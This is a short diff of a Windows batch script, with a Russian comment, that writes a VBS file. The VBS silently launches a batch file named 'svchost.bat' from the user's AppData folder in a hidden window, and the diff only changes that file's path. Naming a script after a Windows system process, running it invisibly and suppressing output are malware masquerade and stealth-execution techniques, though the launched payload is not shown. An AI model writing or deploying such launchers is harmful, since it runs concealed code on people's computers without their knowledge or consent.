@@ -18,7 +18,7 @@ if not exist "%vbsFile%" (
     rem Запись скрипта в VBS файл
     (
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.bat", 0, False
+        WshShell.Run "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.bat", 0, False
     ) > "%vbsFile%"
 ) >nul 2>&1
 
